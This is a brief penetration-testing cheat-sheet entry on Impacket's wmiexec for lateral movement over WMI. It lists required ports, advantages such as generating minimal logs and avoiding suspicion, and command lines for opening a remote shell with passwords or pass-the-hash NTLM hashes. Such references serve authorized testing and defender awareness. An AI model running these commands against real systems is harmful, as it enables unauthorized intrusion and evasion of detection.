### WMI
```
Tool: wmiexec.py (from Impacket)
Shell Type: Interactive Shell
Required Ports: 135 RCP Endpoint Mapper, 49152–65535: Dynamic RPC Ports.
```
Pros and Cons
```
Advantages:
Stealthy: Generates minimal logs.
No files or service creation required.
Frequently used in legitimate administrative tasks, reducing suspicion.

Limitations:
Requires open RPC ports (135 + dynamic ports).
Requires local administrator privileges on the target system.
May be blocked by strict firewall configurations.
```
###### Get Shell
```
impacket-wmiexec domain/username:password@ip
impacket-wmiexec -hashes LMHASH:NTHASH domain/username@ip
```

###### Connecting with authentication
```
impacket-wmiexec domain/'':''@ip
```

